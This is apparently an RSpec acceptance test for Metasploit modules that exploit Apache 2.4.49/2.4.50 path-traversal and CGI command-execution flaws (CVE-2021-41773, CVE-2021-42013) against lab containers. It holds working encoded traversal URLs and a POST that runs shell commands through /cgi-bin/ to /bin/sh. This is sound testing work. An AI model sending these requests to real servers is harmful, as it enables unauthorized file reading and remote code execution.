require 'acceptance_spec_helper'
require 'net/http'

RSpec.describe 'Apache normalization module targets' do
  include_context 'module target'

  {
    'vulnerable49' => ['2.4.49', 'CVE-2021-41773', '.%2e/'],
    'vulnerable50' => ['2.4.50', 'CVE-2021-42013', '.%%32%65/']
  }.each do |service, (version, cve, traversal)|
    context service do
      let(:options) { { 'SSL' => false, 'CVE' => cve } }

      before do
        expect(raw_http(service, '/').body).to include('module-target-apache-normalize')
        expect(raw_http(service, '/')['Server']).to include("Apache/#{version}")
        expect(target_exec(service, 'uname', '-m').strip).to eq('x86_64')
        # Validate the real flaw through an independent HTTP client before testing
        # either Framework module; version strings alone cannot prove this setup.
        response = raw_http(service, "/files/#{traversal * 5}opt/module-target-secret.txt")
        expect(response.code).to eq('200')
        expect(response.body).to include('module-target-traversal-secret')
        command = raw_http(service, "/cgi-bin/#{traversal * 5}bin/sh", method: 'POST', body: 'echo Content-Type: text/plain; echo; echo fixture-rce-marker')
        expect(command.body.strip).to eq('fixture-rce-marker')
      end

      it 'detects path traversal' do
        output = run_target_module('auxiliary/scanner/http/apache_normalize_path', service, options.merge('ACTION' => 'CHECK_TRAVERSAL', 'TARGETURI' => '/files/'))
        expect(output).to include("The target is vulnerable to #{cve}.")
      end

      it 'detects CGI command execution' do
        output = run_target_module('auxiliary/scanner/http/apache_normalize_path', service, options.merge('ACTION' => 'CHECK_RCE'))
        expect(output).to include("The target is vulnerable to #{cve} (mod_cgi is enabled).")
      end

      it 'reads and saves a real file outside the document root' do
        output = run_target_module('auxiliary/scanner/http/apache_normalize_path', service, options.merge(
          'ACTION' => 'READ_FILE', 'TARGETURI' => '/files/', 'FILEPATH' => '/opt/module-target-secret.txt'
        ))
        path = output[/File saved in: (.+)$/, 1]&.strip
        expect(path).not_to be_nil
        expect(File.expand_path(path)).to start_with(File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot/'))
        expect(File.read(path).strip).to eq('module-target-traversal-secret')
      end

      it 'executes an in-memory command twice with independent target proof' do
        prove_payload_twice(service, options.merge('TARGET' => 1, 'PAYLOAD' => 'cmd/unix/generic'))
      end

      %w[x64 x86].each do |arch|
        it "delivers and executes a Linux #{arch} binary twice" do
          prove_payload_twice(service, options.merge('TARGET' => 0, 'PAYLOAD' => "linux/#{arch}/exec"))
        end
      end
    end
  end

  {
    'fixed' => %w[CVE-2021-41773 CVE-2021-42013],
    'guarded49' => %w[CVE-2021-41773],
    'vulnerable50' => %w[CVE-2021-41773]
  }.each do |service, cves|
    cves.each do |cve|
      it "rejects #{cve} on #{service}" do
        expect(raw_http(service, '/').body).to include('module-target-apache-normalize')
        traversal = cve == 'CVE-2021-41773' ? '.%2e/' : '.%%32%65/'
        response = raw_http(service, "/cgi-bin/#{traversal * 5}bin/sh", method: 'POST', body: 'echo; echo fixture-rce-marker')
        expect(response.body).not_to include('fixture-rce-marker')
        output = run_target_module('auxiliary/scanner/http/apache_normalize_path', service, {
          'SSL' => false, 'CVE' => cve, 'ACTION' => 'CHECK_RCE'
        }, allow_errors: true)
        expect(output).to include("The target is not vulnerable to #{cve}")
        expect(output).not_to include("The target is vulnerable to #{cve}")
      end
    end
  end

  def prove_payload_twice(service, options)
    path = '/tmp/module-target-payload-proof'
    2.times do
      target_exec(service, 'rm', '-f', path)
      target_exec(service, 'test', '!', '-e', path)
      original_files = target_exec(service, 'find', '/tmp', '-maxdepth', '1', '-type', 'f', '-print').lines.sort
      output = run_target_module('exploit/multi/http/apache_normalize_path_rce', service, options.merge(
        'CMD' => "printf module-target-payload-proof > #{path}", 'DisablePayloadHandler' => true, 'AllowNoCleanup' => true, 'WfsDelay' => 0
      ))
      expect(output).to include('Attempt to exploit')
      expect(target_exec(service, 'cat', path).strip).to eq('module-target-payload-proof')
      target_exec(service, 'rm', '-f', path)
      expect(target_exec(service, 'find', '/tmp', '-maxdepth', '1', '-type', 'f', '-print').lines.sort).to eq(original_files)
    end
  end

  def raw_http(service, path, method: 'GET', body: nil)
    endpoint = target_endpoint(service)
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 3
    http.read_timeout = 3
    request = Net::HTTPGenericRequest.new(method, !body.nil?, true, path)
    request.body = body if body
    http.request(request)
  end
end
